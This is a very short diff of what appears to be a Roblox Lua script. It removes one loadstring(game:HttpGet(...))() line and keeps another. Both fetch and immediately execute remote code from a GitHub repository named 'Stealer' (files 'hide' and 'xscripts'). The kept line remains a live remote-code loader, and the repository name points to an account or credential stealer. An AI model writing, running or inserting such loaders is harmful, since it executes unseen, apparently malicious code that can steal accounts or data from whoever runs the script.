@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Shalangtalagas/Stealer/refs/heads/main/hide", true))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Shalangtalagas/Stealer/refs/heads/main/xscripts", true))()
 
